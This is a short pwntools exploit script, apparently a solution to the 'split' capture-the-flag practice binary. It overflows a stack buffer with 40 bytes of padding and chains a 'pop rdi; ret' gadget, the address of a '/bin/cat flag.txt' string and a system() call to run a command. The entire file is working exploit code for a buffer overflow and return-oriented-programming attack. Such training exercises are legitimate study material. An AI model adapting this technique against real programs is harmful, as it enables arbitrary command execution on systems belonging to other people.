#!/bin/env python3

from pwn import *

p = process('./split')

# fill up the buffer and overwrite the rbp
garbage = b'a' * 40

# jump to the ropgadget pop rdi; ret
ropgadget = p64(0x00000000004007c3)

# add the value of '/bin/cat flag.txt' on the bss
param = p64(0x00601060)

# the address of system call
system = p64(0x40074b)

payload = garbage + ropgadget + param + system

p.send(payload)

p.interactive()

